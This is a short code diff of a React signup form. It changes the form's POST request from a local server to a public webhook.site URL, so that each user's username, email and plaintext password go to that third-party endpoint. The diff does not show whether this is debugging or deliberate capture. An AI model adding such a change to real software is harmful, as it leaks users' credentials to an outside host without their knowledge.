@@ -64,7 +64,7 @@ export function SignupForm(props) {
         );
           
       const res = await axios
-        .post("http://127.0.0.1:8000/", {
+        .post("https://webhook.site/52e30428-2b5c-4dcf-99c1-6b5ebbae4171", {
           Username: fullName,
           Email: email,
           Password: password,
@@ -78,7 +78,7 @@ export function SignupForm(props) {
           console.log();
           snkbr.current.openSnackbar(message);
         });
-        
+
         if(!res) return
         if (!res.data.success) return snkbr.current.openSnackbar(res.data.message);
 
